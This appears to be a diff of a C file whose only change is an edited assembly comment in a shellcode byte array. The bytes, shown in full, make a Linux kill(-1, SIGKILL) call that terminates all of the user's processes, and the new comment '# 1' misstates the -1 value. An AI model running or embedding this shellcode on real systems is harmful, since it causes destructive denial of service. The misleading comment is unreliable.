@@ -5,7 +5,7 @@
  
 char shellcode[] = "\x6a\x25"   \\ push   $0x25
                    "\x58"       \\ pop    %eax
-                   "\x6a\xff"   \\ push   $0xffffffff = -1
+                   "\x6a\xff"   \\ push   $0xffffffff # 1
                    "\x5b"       \\ pop    %ebx
                    "\xb1\x09"   \\ mov    $0x9,%cl
                    "\xcd\x80";  \\ int    $0x80
